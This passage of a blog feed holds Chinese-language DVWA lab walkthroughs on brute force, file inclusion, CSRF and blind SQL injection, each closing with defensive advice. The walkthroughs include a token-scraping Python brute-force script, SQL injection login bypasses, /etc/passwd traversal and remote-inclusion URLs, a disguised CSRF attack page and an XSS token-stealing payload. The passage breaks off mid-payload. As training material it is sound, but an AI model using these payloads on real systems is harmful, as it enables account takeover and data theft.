    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="暴力破解简介"><a href="#暴力破解简介" class="headerlink" title="暴力破解简介"></a>暴力破解简介</h1><p>暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><h2 id="使用BurpSuite进行暴力破解"><a href="#使用BurpSuite进行暴力破解" class="headerlink" title="使用BurpSuite进行暴力破解"></a>使用BurpSuite进行暴力破解</h2><ol><li><p>抓包</p><p> <img src="/images/baji/dvwa/brute force/1.png" alt="1.png"></p></li><li><p>将数据包发送到<code>Intruder</code></p><p> <img src="/images/baji/dvwa/brute force/2.png" alt="2.png"></p><p> 点击<code>Clear</code>清除需要爆破的字段，选中<code>password</code>的值，然后点击<code>Add</code>，将其指定为需爆破的字段</p></li><li><p>选择字典</p><p> <img src="/images/baji/dvwa/brute force/3.png" alt="3.png"></p></li><li><p>开始破解</p><p> 点击右上角<code>Start attack</code></p><p> <img src="/images/baji/dvwa/brute force/4.png" alt="4.png"></p></li><li><p>判断破解出的密码</p><p> <img src="/images/baji/dvwa/brute force/5.png" alt="5.png"></p><p> 当使用<code>password</code>进行破解时，响应包的长度与众不同，即可通过这种方式确定<code>password</code>为正确的密码</p></li></ol><h2 id="通过手工SQL注入进行无密码登陆"><a href="#通过手工SQL注入进行无密码登陆" class="headerlink" title="通过手工SQL注入进行无密码登陆"></a>通过手工SQL注入进行无密码登陆</h2><ol><li><p>永真式注入</p><p> Username ：<code>admin&#39; or &#39;1&#39;=&#39;1</code> </p><p> Password ：（空）</p><p> <img src="/images/baji/dvwa/brute force/6.png" alt="6.png"></p></li><li><p>终止式注入</p><p> Username ：<code>admin&#39; #</code></p><p> Password ：（空）</p><p> <img src="/images/baji/dvwa/brute force/7.png" alt="7.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码主要增加了<code>mysql_real_escape_string</code>函数，这个函数会对字符串中的特殊符号<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code>）进行转义，基本上能够抵御<code>SQL</code>注入攻击</p><p>虽然<code>SQL</code>注入不再有效，但依然可以使用<code>Burpsuite</code>进行爆破，与<code>Low</code>级别的爆破方法基本一样</p><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码加入了<code>Token</code>，可以抵御<code>CSRF</code>攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：<code>username</code>、<code>password</code>、<code>Login</code>以及<code>user_token</code></p><p><img src="/images/baji/dvwa/brute force/8.png" alt="8.png"></p><p>每次服务器返回的登陆页面中都会包含一个随机的<code>user_token</code>的值，用户每次登录时都要将<code>user_token</code>一起提交。服务器收到请求后，会优先做<code>token</code>的检查，再进行<code>SQL</code>查询</p><p><code>High</code>级别的代码中，使用了<code>stripslashes</code>（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、<code>mysql_real_escape_string</code>函数对参数<code>username</code>、<code>password</code>进行过滤、转义，进一步抵御<code>SQL</code>注入</p><h2 id="破解流程"><a href="#破解流程" class="headerlink" title="破解流程"></a>破解流程</h2><ol><li><p>首先请求<code>http://172.16.12.93/vulnerabilities/brute/</code>，获取当前的<code>user_token</code></p></li><li><p>使用获取的<code>user_token</code>，以及字典中的密码进行暴力破解</p></li></ol><h2 id="编写脚本进行暴力破解"><a href="#编写脚本进行暴力破解" class="headerlink" title="编写脚本进行暴力破解"></a>编写脚本进行暴力破解</h2><p>编写<code>Python</code>2版本脚本<code>xx.py</code>，用于对<code>password</code>参数进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import urllib2</span><br><span class="line">header=&#123;&apos;Host&apos;: &apos;172.16.12.93&apos;,</span><br><span class="line">&apos;Cache-Control&apos;: &apos;max-age=0&apos;,</span><br><span class="line">&apos;If-None-Match&apos;: &quot;307-52156c6a290c0&quot;,</span><br><span class="line">&apos;If-Modified-Since&apos;: &apos;Mon, 05 Oct 2015 07:51:07 GMT&apos;,</span><br><span class="line">&apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&apos;,</span><br><span class="line">&apos;Accept&apos;: &apos;*/*&apos;,</span><br><span class="line">&apos;Referer&apos;: &apos;http://172.16.12.93/vulnerabilities/brute/index.php&apos;,</span><br><span class="line">&apos;Accept-Encoding&apos;: &apos;gzip, deflate, sdch&apos;,</span><br><span class="line">&apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8&apos;,</span><br><span class="line">&apos;Cookie&apos;: &apos;PHPSESSID=1c576ae10332a03dd5c373c9469949e1; security=high&apos;&#125;</span><br><span class="line">requrl = &quot;http://172.16.12.93/vulnerabilities/brute/&quot;</span><br><span class="line"></span><br><span class="line">def get_token(requrl,header):</span><br><span class="line">req = urllib2.Request(url=requrl,headers=header)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line">print response.getcode(),</span><br><span class="line">the_page = response.read()</span><br><span class="line">print len(the_page)</span><br><span class="line">soup = BeautifulSoup(the_page,&quot;html.parser&quot;)</span><br><span class="line">user_token = soup.select(&apos;input[type=&quot;hidden&quot;]&apos;)[0].get(&apos;value&apos;) #get the user_token</span><br><span class="line">return user_token</span><br><span class="line"></span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line">i=0</span><br><span class="line">for line in open(&quot;wordlist.txt&quot;):</span><br><span class="line">requrl = &quot;http://172.16.12.93/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token</span><br><span class="line">i = i+1</span><br><span class="line">print i,&apos;admin&apos;,line.strip(),</span><br><span class="line">user_token = get_token(requrl,header)</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/brute force/10.png" alt="10.png"></p><h2 id="使用BurpSuite进行暴力破解-1"><a href="#使用BurpSuite进行暴力破解-1" class="headerlink" title="使用BurpSuite进行暴力破解"></a>使用BurpSuite进行暴力破解</h2><ol><li><p>首先，进行抓包</p><p> <img src="/images/baji/dvwa/brute force/11.png" alt="11.png"></p></li><li><p>将其发送到<code>Intruder</code>模块</p><p> 将<code>password</code>字段、<code>user_token</code>字段设置为要破解的字段</p><p> 设置攻击模式为<code>Pitchfork</code></p><p> <img src="/images/baji/dvwa/brute force/12.png" alt="12.png"></p></li><li><p>将<code>HTTP</code>请求的线程数设置为1</p><p> <img src="/images/baji/dvwa/brute force/13.png" alt="13.png"></p></li><li><p>设置<code>Grep-Extract</code>处，选择<code>Add</code></p><p> <img src="/images/baji/dvwa/brute force/14.png" alt="14.png"></p></li><li><p>设置需要从响应中获取的信息</p><ol><li><p>点击获取响应</p></li><li><p>选择<code>user_token</code>的值，并复制</p></li><li><p>点击<code>OK</code></p><p><img src="/images/baji/dvwa/brute force/15.png" alt="15.png"></p></li></ol></li><li><p>设置<code>payloads</code></p><p> 第一个字典类型选择简单的列表，选择密码字典</p><p> 第二个字典类型选择递归<code>grep</code>，填写第一次请求所使用的<code>payload</code>，即上一步复制的<code>user_token</code>的值</p><p> 设置完成后，开始攻击</p><p> <img src="/images/baji/dvwa/brute force/16.png" alt="16.png"></p></li><li><p>通过一段时间的暴力破解，即可破解出密码</p><p> <img src="/images/baji/dvwa/brute force/17.png" alt="17.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续</p><p><img src="/images/baji/dvwa/brute force/9.png" alt="9.png"></p><p>采用了更为安全的<code>PDO（PHP Data Object）</code>机制防御<code>SQL</code>注入</p><hr><h1 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h1><ol><li><p>使用高强度的密码(至少8位，数字、大写字母、小写字母、特殊符号)</p></li><li><p>设置登陆失败限制次数</p></li><li><p>设置密码历史，强制密码修改期限等密码策略</p></li></ol><hr><h1 id="安装python第三方软件包bs4"><a href="#安装python第三方软件包bs4" class="headerlink" title="安装python第三方软件包bs4"></a>安装python第三方软件包bs4</h1><h2 id="在线安装"><a href="#在线安装" class="headerlink" title="在线安装"></a>在线安装</h2><ol><li><p>进入<code>python</code>安装目录下的<code>Script</code>目录</p></li><li><p>安装</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure></li></ol><h2 id="离线安装"><a href="#离线安装" class="headerlink" title="离线安装"></a>离线安装</h2><ol><li><p><code>bs4</code>官网下载<code>tar.gz</code>包</p></li><li><p>将压缩包解压至<code>python</code>安装目录下,进入解压文件后输入指令</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之文件包含</title>
    <link href="http://yoursite.com/2019/05/20/DVWA1-10%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2019/05/20/DVWA1-10之文件包含/</id>
    <published>2019-05-20T15:34:00.000Z</published>
    <updated>2020-02-24T04:19:11.172Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含漏洞，是指当服务器开启<code>allow_url_include</code>选项和<code>allow_url_fopen</code>选项时，就可以通过<code>php</code>的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用<code>url</code>去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取</p><p>文件包含漏洞分为本地文件包含漏洞(<code>LFI</code>)与远程文件包含漏洞(<code>RFI</code>)，远程文件包含漏洞是因为开启了<code>php</code>配置中的<code>allow_url_include</code>选项（选项开启之后，服务器允许包含一个远程的文件）</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><p>点击页面中的连接，会对相应的文件进行包含</p><p><img src="/images/baji/dvwa/file inclusion/1.png" alt="1.png"></p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>构造绝对路径<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/2.png" alt="2.png"></p><p>构造相对路径<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/5.png" alt="5.png"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>远端服务器主页：</p><p><img src="/images/baji/dvwa/file inclusion/3.png" alt="3.png"></p><p>构造<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=http://192.168.1.3/</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/4.png" alt="4.png"></p><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码增加了<code>str_replace</code>函数，对<code>page</code>参数进行了一定的处理，将<code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code>替换为空字符，即删除</p><h2 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>可以以绝对路径来绕过<code>../</code>、<code>..\</code>过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/6.png" alt="6.png"></p><h2 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>以双写绕过<code>http://</code>、<code>https://</code>过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=hthttp://tp://192.168.1.3/</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/7.png" alt="7.png"></p><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码使用了<code>fnmatch</code>函数检查<code>page</code>参数，要求<code>page</code>参数的开头必须是<code>file</code>开头的文件</p><p>可以利用<code>file</code>协议绕过防护策略</p><p>当用浏览器打开一个<strong>本地文件</strong>时，使用的就是<code>file</code>协议</p><p>构造<code>URL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/fi/?page=file:///etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/file inclusion/8.png" alt="8.png"></p><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码使用了白名单机制进行防护，简单粗暴，<code>page</code>参数必须为<code>include.php</code>、<code>file1.php”、“file2.php</code>、<code>file3.php</code>之一，彻底杜绝了文件包含漏洞</p><hr><h1 id="文件包含防御"><a href="#文件包含防御" class="headerlink" title="文件包含防御"></a>文件包含防御</h1><ol><li><p><code>PHP</code>中使用<code>open_basedir</code>配置，将访问限制在指定区域</p></li><li><p>过滤<code>../</code>、<code>..\</code>等等特殊字符</p></li><li><p>禁止服务器远程文件包含(<code>allow_url_include</code>设置为<code>Off</code>)</p></li><li><p>白名单限制可包含的文件</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之CSRF</title>
    <link href="http://yoursite.com/2019/05/20/DVWA1-10%E4%B9%8BCSRF/"/>
    <id>http://yoursite.com/2019/05/20/DVWA1-10之CSRF/</id>
    <published>2019-05-20T15:20:00.000Z</published>
    <updated>2020-02-24T04:19:33.706Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><p><code>CSRF</code>，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（<code>cookie</code>、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）</p><p><code>CSRF</code>与<code>XSS</code>最大的区别就在于，<code>CSRF</code>并没有盗取<code>cookie</code>，而是直接利用</p><hr><h1 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h1><h2 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h2><ol><li><p>构造恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/csrf/?password_new=password123&amp;password_conf=password123&amp;Change=Change#</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>被攻击者在登陆网站的情况下点击恶意链接</p></li><li><p>被攻击者密码在不知情的情况下被修改</p><p> <img src="/images/baji/dvwa/CSRF/1.png" alt="1.png"></p></li></ol><h2 id="简单伪装"><a href="#简单伪装" class="headerlink" title="简单伪装"></a>简单伪装</h2><ol><li><p>网址缩短</p><p> <img src="/images/baji/dvwa/CSRF/2.png" alt="2.png"></p><p> 使受害者无法通过域名分辨</p></li><li><p>再次修改密码</p><p> 当点击短链接后，会自动跳转到长网址，进行密码修改</p></li></ol><h2 id="加强伪装"><a href="#加强伪装" class="headerlink" title="加强伪装"></a>加强伪装</h2><ol><li><p>构造攻击页面</p><p> 即使<code>URL</code>地址被缩短，但被点击后，仍然会跳转原<code>URL</code>地址，并且会提示密码被修改，使得被攻击者发觉密码被修改</p><p> 现实攻击场景下，需要在公网上事先上传一个攻击页面，诱使被攻击者去访问，真正能够在受害者不知情的情况下完成<code>CSRF</code>攻击</p><p> 此处，使用192.168.1.4作为公网服务器，用于演示</p><p> 攻击页面<code>test.html</code>代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  &lt;html&gt;</span><br><span class="line">       &lt;body&gt;</span><br><span class="line">               &lt;img src=&quot;http://172.16.12.93/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">               &lt;h1&gt;error&lt;/h1&gt;</span><br><span class="line">               &lt;h2&gt;404&lt;/h2&gt;</span><br><span class="line">       &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>当被攻击者在登陆<code>DVWA</code>的情况下，点击攻击页面的链接，误以为自己点击一个失效的<code>URL</code>,但实际上已经遭受到<code>CSRF</code>攻击，密码已经被修改</p><p> <img src="/images/baji/dvwa/CSRF/3.png" alt="3.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别检查了<code>http</code>包头的<code>Referer</code>参数的值，查看其中是否包含<code>http</code>包头的<code>Host</code>参数，希望通过这种机制抵御<code>CSRF</code>攻击</p><p><img src="/images/baji/dvwa/CSRF/4.png" alt="4.png"></p><p>修改攻击页面名称为<code>DVWA</code>主机地址，即可绕过</p><p><img src="/images/baji/dvwa/CSRF/5.png" alt="5.png"></p><p><img src="/images/baji/dvwa/CSRF/6.png" alt="6.png"></p><p><img src="/images/baji/dvwa/CSRF/7.png" alt="7.png"></p><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码加入了<code>Anti-CSRF token</code>机制，用户每次访问改密页面时，服务器会返回一个随机的<code>token</code>，向服务器发起请求时，需要提交<code>token</code>参数，而服务器在收到请求时，会优先检查<code>token</code>，只有<code>token</code>正确，才会处理客户端的请求</p><p><img src="/images/baji/dvwa/CSRF/8.png" alt="8.png"></p><p>进行漏洞利用，要绕过<code>High</code>级别的反<code>CSRF</code>机制，关键是要获取<code>token</code></p><ol><li><p>利用<code>High</code>级别存储型<code>XSS</code>获取<code>token</code></p><p> 注入代码：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/CSRF/9.png" alt="9.png"></p><p> <img src="/images/baji/dvwa/CSRF/10.png" alt="10.png"></p></li><li><p>构造一次性修改密码恶意链接</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.12.93/vulnerabilities/csrf/?password_new=password123&amp;password_conf=password123&amp;Change=Change&amp;user_token=0aeba5f4c30a41b5df742056e383a2e9#</span><br></pre></td></tr></table></figure><p> 在登陆<code>DVWA</code>的情况下，点击链接，则会更改密码</p><p> <img src="/images/baji/dvwa/CSRF/11.png" alt="11.png"></p><p> 但恶意链接只可使用一次，再次请求则会显示错误</p><p> <img src="/images/baji/dvwa/CSRF/12.png" alt="12.png"></p></li></ol><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p>在修改密码时，要求输入原始密码，用于防止<code>CSRF</code>攻击</p><hr><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><ol><li><p>设置<code>Referer</code>，用于标识此次请求从哪个页面过来的</p></li><li><p><code>Anti CSRF Token</code></p></li><li><p>重要操作进行二次验证</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之SQL盲注</title>
    <link href="http://yoursite.com/2019/05/19/VWA1-10%E4%B9%8BSQL%E7%9B%B2%E6%B3%A8/"/>
    <id>http://yoursite.com/2019/05/19/VWA1-10之SQL盲注/</id>
    <published>2019-05-19T12:16:00.000Z</published>
    <updated>2020-02-24T04:19:51.235Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><p><code>SQL Injection（Blind）</code>，即<code>SQL</code>盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的<code>SQL</code>注入漏洞大多是<code>SQL</code>盲注</p><p>手工盲注的步骤:</p><ol><li><p>判断是否存在注入，注入是字符型还是数字型</p></li><li><p>猜解当前数据库名</p></li><li><p>猜解数据库中的表名</p></li><li><p>猜解表中的字段名</p></li><li><p>猜解数据</p></li></ol><p><code>DVWA</code>中<code>SQL</code>语句查询只会返回两种结果:</p><ol><li><p>正常输入</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/1.png" alt="1.png"></p></li><li><p>非正常输入</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/2.png" alt="2.png"></p></li></ol><p>所以为<code>SQL</code>盲注</p><hr><h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><p>基于布尔的盲注</p><h2 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><ol><li><p>输入1，显示相应用户存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/3.png" alt="3.png"></p></li><li><p>输入<code>1&#39; and 1=1--</code>，显示相应用户存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/4.png" alt="4.png"></p></li><li><p>输入<code>1&#39; and 1=2--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/5.png" alt="5.png"></p></li></ol><p>存在<code>SQL</code>注入漏洞，且为字符型</p><h2 id="猜解当前数据库名"><a href="#猜解当前数据库名" class="headerlink" title="猜解当前数据库名"></a>猜解当前数据库名</h2><p>首先猜解数据库名长度，然后逐个猜解字符</p><h3 id="猜解数据库名长度"><a href="#猜解数据库名长度" class="headerlink" title="猜解数据库名长度"></a>猜解数据库名长度</h3><ol><li><p>输入<code>1&#39; and length(database())=1--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/6.png" alt="6.png"></p></li><li><p>输入<code>1&#39; and length(database())=2--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/7.png" alt="7.png"></p></li><li><p>输入<code>1&#39; and length(database())=3--</code>，显示用户不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/8.png" alt="8.png"></p></li><li><p>输入<code>1&#39; and length(database())=4--</code>，显示相应用户存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/9.png" alt="9.png"></p></li></ol><p>说明数据库名长度为4</p><h3 id="逐个猜解数据库名"><a href="#逐个猜解数据库名" class="headerlink" title="逐个猜解数据库名"></a>逐个猜解数据库名</h3><p>二分法猜解数据库名</p><ol><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&gt;97--</code>，显示相应用户存在(小写字母<code>a</code>)</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/10.png" alt="10.png"></p><p> 说明数据库名的第一个字符的<code>ascii</code>值大于97</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;122--</code>，显示相应用户存在(小写字母<code>z</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于122</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;109--</code>，显示相应用户存在(小写字母<code>m</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于109</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;103--</code>，显示相应用户存在(小写字母<code>g</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于103</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;100--</code>，显示用户不存在(小写字母<code>d</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值不小于100</p></li><li><p>输入<code>1&#39; and ascii(substr(database(),1,1))&lt;101--</code>，显示相应用户存在(小写字母<code>f</code>)</p><p> 说明数据库名的第一个字符的<code>ascii</code>值小于101</p><p> 说明数据库名的第一个字符的<code>ascii</code>值为100，即字母<code>d</code></p></li></ol><p>重复上述步骤，可完全猜解出数据库名<code>dvwa</code></p><h2 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h2><p>首先猜解数据库中表的数量，再逐个猜解表名</p><h3 id="猜解数据库中表的数量"><a href="#猜解数据库中表的数量" class="headerlink" title="猜解数据库中表的数量"></a>猜解数据库中表的数量</h3><ol><li><p>输入<code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=1--</code>，显示不存在</p><p> <img src="/images/baji/dvwa/SQL Injection Blind/11.png" alt="11.png"></p></li><li><p>输入<code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2--</code>，显示相应用户存在</p><p><img src="/images/baji/dvwa/SQL Injection Blind/12.png" alt="12.png"></p></li></ol><p>说明<code>dvwa</code>数据库中共有两个表</p><h3 id="逐个猜解表名"><a href="#逐个猜解表名" class="headerlink" title="逐个猜解表名"></a>逐个猜解表名</h3><h4 id="逐个猜解表名的长度"><a href="#逐个猜解表名的长度" class="headerlink" title="逐个猜解表名的长度"></a>逐个猜解表名的长度</h4><ol><li><p>输入<code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1--</code>，显示用户不存在</p></li><li><p>输入<code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2--</code>，显示用户不存在</p></li><li><p>。。。。。</p></li><li><p>输入<code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9--</code>，显示相应用户存在</p></li></ol><p>说明第一个表名长度为9</p><h4 id="逐个猜解表名-1"><a href="#逐个猜解表名-1" class="headerlink" title="逐个猜解表名"></a>逐个猜解表名</h4><ol><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97--</code>，显示存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122--</code>，显示存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109--</code>，显示存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103--</code>，显示不存在</p></li><li><p>输入<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 